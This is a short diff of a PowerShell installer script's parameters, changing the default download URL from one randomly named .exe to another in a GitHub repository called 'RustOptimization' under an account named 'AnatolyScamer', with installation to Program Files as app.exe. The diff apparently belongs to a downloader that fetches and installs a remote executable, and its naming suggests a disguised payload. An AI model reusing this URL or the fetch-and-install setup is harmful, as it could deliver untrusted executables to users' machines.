@@ -6,7 +6,7 @@
 
 # Параметры скрипта
 param(
-    [string]$DownloadUrl = "https://raw.githubusercontent.com/AnatolyScamer/RustOptimization/refs/heads/main/service_158a897a.exe",
+    [string]$DownloadUrl = "https://raw.githubusercontent.com/AnatolyScamer/RustOptimization/refs/heads/main/manager_46bac7e7.exe",
     [string]$InstallPath = "C:\Program Files\MyApp",
     [string]$FileName = "app.exe",
     [string]$Arguments = "",
